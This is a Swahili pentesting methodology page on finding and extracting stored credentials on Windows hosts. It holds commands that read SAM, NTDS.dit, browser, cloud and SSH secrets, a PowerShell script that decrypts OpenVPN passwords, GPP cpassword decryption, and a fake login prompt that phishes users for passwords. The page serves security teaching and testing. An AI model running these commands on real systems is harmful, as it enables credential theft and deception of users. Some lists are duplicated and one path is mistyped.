Baadhi ya usakinishaji wa zamani wa usaidizi wa mbali huhifadhi majina ya thamani yanayohusiana na nywila chini ya funguo maalum za registry za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha nywila tuli ya session iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu funguo za registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la thamani ni kidokezo tu cha ukaguzi: thibitisha toleo lililosakinishwa, data ya thamani inayoweza kusomwa, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka nywila ya usaidizi wa mbali hadi akaunti ya Windows yenye mamlaka zaidi kunahitaji pia nywila hiyo hiyo kutumiwa kwa akaunti hiyo na kuwepo kwa idhini ya kuitumia. Usijumuishe ciphertext na nywila zilizorejeshwa kwenye matokeo ya kawaida ya uorodheshaji.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa unashuku kuwa workbook inayoweza kusomwa na kushirikiwa ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inaeleza](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kwamba ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake hauthibitishi kuwa maudhui ya workbook yamesimbwa kwa fiche. Kagua faili zilizoidhinishwa na zinazohusika pekee, na epuka kuchapisha siri zinazoweza kuwepo wakati wa uorodheshaji mpana. Njia ya `.xlsx` inayosomeka, laha iliyolindwa, au safu wima iliyofichwa peke yake haithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina mamlaka zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

### Mabadiliko ya patch yaliyohifadhiwa na seva ya CI

Seva ya CI inaweza kuhifadhi mabadiliko ya msimbo wa chanzo yaliyowasilishwa katika saraka yake ya data hata baada ya build kukamilika. [TeamCity inaandika](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` hutumika kuhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeo yaliyofutwa au kuongezwa kwa faili ya credential, ufunguo wa usimbaji fiche, au script inayotumia vyote viwili. Kwa mfano, mtiririko wa kazi wa PowerShell `ConvertTo-SecureString -Key` unahitaji ufunguo wa AES pamoja na string iliyosimbwa kwa fiche; [Microsoft inaandika](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kando. Kagua majina ya patch zinazoweza kufikiwa kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha siri katika matokeo ya kawaida ya uorodheshaji. Njia ya patch, thamani iliyosimbwa kwa fiche, au rejeo la ufunguo peke yake havithibitishi credential halali au ufikiaji wa mamlaka ya juu. Zuia ACL za saraka ya data na epuka kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa nywila za msimamizi wa ndani

Kibadilishaji nywila kilichotengenezwa ndani ya kampuni kinaweza kuhifadhi nywila ya msimamizi wa ndani iliyosimbwa kwa fiche katika huduma ya ndani huku kikiweka credentials za datastore kwenye faili ya `.env` inayosomeka au karibu na binary ya updater. Kagua scheduled task, akaunti, ACL za usanidi, listener na ruhusa za datastore za updater kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani aliye na credentials halali, lakini uthibitishaji pekee hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya usimbaji fiche au nyenzo za ufunguo zinapatikana karibu na ciphertext, kagua kwa makini jinsi ufunguo unavyotolewa kabla ya kuamini usimbaji huo. Mbinu inayotoa ufunguo wa AES kwa utaratibu uleule kutoka seed iliyofichuka kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda nywila hiyo; Go inaeleza kuwa package hiyo haifai kwa randomness inayohusika na usalama. Thibitisha kwamba nywila yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo katika kundi la local Administrators kabla ya kuichukulia kama njia ya kuongeza mamlaka. Scheduled task, njia ya `.env`, au blob iliyosimbwa kwa fiche peke yake haithibitishi masharti hayo. Usijumuishe nywila na nyenzo za ufunguo kwenye matokeo ya kawaida ya uorodheshaji.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti nywila za msimamizi wa ndani. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma index maalum.

### Kumbukumbu za plugin za seva ya Java na matumizi upya ya credentials

Baadhi ya plugin za seva ya Java husambazwa kama kumbukumbu za JAR katika saraka ya `plugins` ya seva. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode iliyo na credential ya huduma iliyopachikwa. Kagua kumbukumbu hiyo kwa idhini pekee na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya uorodheshaji. Njia ya plugin peke yake haithibitishi kuwa kuna siri, na nywila ya huduma iliyorejeshwa husababisha mamlaka ya juu tu ikiwa pia ni halali kwa akaunti yenye mamlaka zaidi. Kagua ACL za faili husika na ubadilishe credentials zilizotumiwa tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa saraka na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya kumbukumbu.

### Credentials za database iliyopachikwa ya Openfire

Usakinishaji wa Openfire unaotumia database iliyopachikwa unaweza kuweka `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na sifa ya `passwordKey`. [Nyaraka za Openfire kuhusu user-provider](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa nywila zinaweza kuhifadhiwa kama maandishi ya kawaida au kusimbwa kwa fiche kwa ufunguo uliohifadhiwa katika sifa hiyo. Nywila iliyorejeshwa ni muhimu kwa kuongeza mamlaka tu ikiwa bado ni halali kwa utambulisho wenye mamlaka zaidi; jina la faili peke yake halithibitishi ufikiaji wa kusoma wala matumizi upya ya credential. Njia hiyo ni kidokezo cha kuorodhesha, kwa hiyo usijumuishe maudhui ya database na credentials kwenye matokeo ya kawaida ya uorodheshaji.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kuonyesha porti na kiolesura cha bind kilichosanidiwa kwa admin console hata wakati database ya nje inatumika. Openfire kwa kawaida hu-bind admin console kwenye loopback; hata hivyo, akaunti ya ndani bado inaweza kufikia anwani hiyo ikiwa listener inaendeshwa. Kagua listener halisi, role ya admin iliyoidhinishwa, sera ya kupakia plugin na utambulisho wa huduma ya Openfire kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha msimbo wa plugin kuendeshwa katika muktadha wa huduma, ambao unaweza kuwa na mamlaka ya juu ikiwa huduma inaendeshwa kama LocalSystem. Nywila inayolingana ya akaunti au njia ya usanidi inayosomeka peke yake haithibitishi ufikiaji wa admin console au utekelezaji wa msimbo. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [sifa ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa forensic

Usanidi wa seva ya Velociraptor, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye mamlaka ya chini anaweza kusoma ufunguo huo, anaweza kuunda cheti cha mteja cha API. Ikiwa hilo litasababisha mamlaka ya juu hutegemea roles za watumiaji za seva, ufikikaji wa API na utambulisho ambao seva au agent lengwa huendeshwa nao. Usanidi wa mteja una nyenzo tofauti; kuupata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya deployments huhifadhi ufunguo binafsi wa CA nje ya mtandao, kwa hiyo huenda usanidi wa seva unaosomeka usiwe na ufunguo wa kusaini pia.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** katika saraka yake ya usakinishaji na nakala rudufu zozote zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya huduma ikiwa ni tofauti. Thibitisha kwamba utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha ufunguo binafsi kwenye logi au matokeo ya uorodheshaji. Mtiririko wa kazi wa vendor wa `config api_client` hutumia ufunguo wa CA kutoa cheti cha mteja, lakini role inayofaa upande wa seva inahitajika pia; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika kwenye datastore au kuanzisha upya. Utambulisho wa seva wenye mamlaka ya juu uliopo tayari unaweza kutoa njia hata kama ruhusa hizo za kuandika hazipatikani. Hoja za API zenye ruhusa za utekelezaji huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na mamlaka ya juu.

Linda usanidi wa seva na nakala rudufu kwa ACL zenye vizuizi, hifadhi ufunguo wa kusaini wa CA nje ya mtandao inapowezekana, na punguza roles za API na ufikiaji wa listener. Tazama [nyaraka za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni meneja tofauti wa session. Hifadhi yake asilia iliyosimbwa inaweza kuwa katika `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ilhali nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa uhamishaji wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kwamba exports husimbwa kwa nenosiri na zinaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi asilia. Kagua ruhusa za faili na njia kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kwamba credential yoyote iliyohifadhiwa bado ni halali au ina privileges za juu zaidi.

### Vifunguo vya Host vya SSH vya PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys kwenye registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa ufunguo wa SSH uliohifadhiwa. Huhifadhiwa ukiwa umesimbwa kwa njia fiche, lakini unaweza kusimbuliwa kwa urahisi ukitumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana kuwa mbinu hii si halali tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa asymmetric key.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi ukitumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazoweza kusomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Tanguliza saraka za backup au image zinazofikiwa ndani ya kompyuta, na kagua **majina ya vipengee** vya image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi huwa njia zisizo sahihi. SMB share ni njia tofauti ya ufikiaji na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya wigo. Tazama mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Cached GPP Password

Hapo awali kulikuwa na kipengele kilichoruhusu usambazaji wa akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nenosiri ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliowekwa wazi kwenye nyaraka, zingeweza kusimbuliwa na mtumiaji yeyote aliyethibitishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kutafuta faili za GPP zilizohifadhiwa kwenye kifaa ambazo zina sehemu ya "cpassword" isiyo tupu. Inapopata faili kama hiyo, kazi hiyo husimbua nenosiri na kurudisha kitu maalum cha PowerShell. Kitu hiki kina maelezo kuhusu GPP na eneo la faili, hivyo kusaidia kutambua na kurekebisha udhaifu huu wa usalama.

Tafuta faili hizi katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za backup katika webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia maudhui inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumiwa tena. Angalia physical path iliyosanidiwa ya tovuti na ikiwa archive inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kama ufichuzi. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni mahali pa kuanzia tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa bila kufungua archives:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kuwa ina siri au kwamba credential iliyopatikana inatoa ruhusa za juu zaidi.

### OpenVPN credentials

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza **kumwomba mtumiaji aweke credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzifahamu (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** zake ni **hatari sana**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na taarifa za kuingia**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **nywila** katika **maandishi wazi** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Toleo la orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi cha `.psafe3`. Ichukulie jina la faili linalolingana kama faili inayoweza kuwa vault iliyosimbwa; kuwepo kwake hakuthibitishi kwamba unaweza kuisoma, kuifungua au kutumia credentials zilizohifadhiwa humo. Kagua profaili za watumiaji unazoweza kufikia na mizizi ya kushiriki faili iliyosanidiwa unapochunguza mahali faili hizo zimehifadhiwa.

Faili ya KeePass `.kdbx` inayosomeka vilevile ni kidokezo tu cha vault iliyosimbwa. Ili kuifungua, unahitaji master-password halisi pamoja na key-file au vipengele vya akaunti vilivyosaniidiwa, ikiwa vipo. Iwapo ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT katika ingizo, thibitisha akaunti iliyotajwa na kama NT hash ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault lenyewe halitoi haki za Administrator au SYSTEM; ufikiaji wa huduma za mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia ziwepo. Orodha ya mali inapaswa kuripoti njia ya vault na kama inasomeka, bila kuchapisha hifadhidata au credentials zilizohifadhiwa.

Tafuta katika faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Lahaja ya amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials katika RecycleBin

Unapaswa pia kuangalia Recycle Bin ili kutafuta credentials

Kagua entries zinazoweza kufikiwa kwenye Recycle Bin kwa backups na configuration archives zilizofutwa, pamoja na faili ambazo majina yake yanataja credentials waziwazi. Backup muhimu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na umri wa miezi kadhaa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama entry yake ya `$R` inayolingana; kagua metadata na ruhusa ya kusoma ya utambulisho wa sasa kabla ya kufungua archive. Kuwepo kwa faili kunategemea volume, user SID, na ruhusa za faili, kwa hiyo listing tupu haithibitishi kwamba hakuna backup inayoweza kurejeshwa. Chukulia jina la archive kama mgombea wa kukaguliwa, si uthibitisho kwamba ina secret halali.

Faili ya `.pfx` iliyofutwa inayoweza kufikiwa pia inaweza kuwa kidokezo cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kusaini PowerShell script iliyobadilishwa; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji wa cross-account unahitaji utambulisho wa sasa uweze kurekebisha script husika, rule inayotumika ikubali signature itakayotokana nayo kwa script na account lengwa, na scheduled task au consumer mwingine mwenye privileges za juu zaidi iendeshe script hiyo kwa hakika. Jina la faili la `.pfx`, subject ya certificate, au script inayoweza kuandikwa pekee havithibitishi mlolongo huo. Kagua metadata, ACLs, policy, na command ya scheduled task kabla ya kufungua private-key material au kuanzisha task.

Kagua pia profile databases za messaging-client zinazoweza kufikiwa, notes, na faili zilizopokewa ili kutafuta dalili za credentials. BitLocker recovery export inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya backup archive yenye jina. Nyenzo kama hizo zinaweza kutoa ufikiaji wa data volume tofauti iliyosimbwa, iliyo na backups za zamani; kagua volume na archive tu ikiwa unaidhinishwa kufanya hivyo. Ikiwa backup ina `NTDS.dit`, kurejesha domain credentials offline kunahitaji pia hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kwamba kuna recovery key inayoweza kutumika au domain backup.

Ili **kurejesha nywila** zilizohifadhiwa na programu mbalimbali unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Registry keys nyingine zinazoweza kuwa na credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Kutoa funguo za openssh kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya vivinjari

Unapaswa kuangalia hifadhidata ambako nywila za **Chrome au Firefox** zimehifadhiwa.\
Unapaswa kuangalia hifadhidata ambako nywila za **Chrome, Edge au Firefox** zimehifadhiwa.\
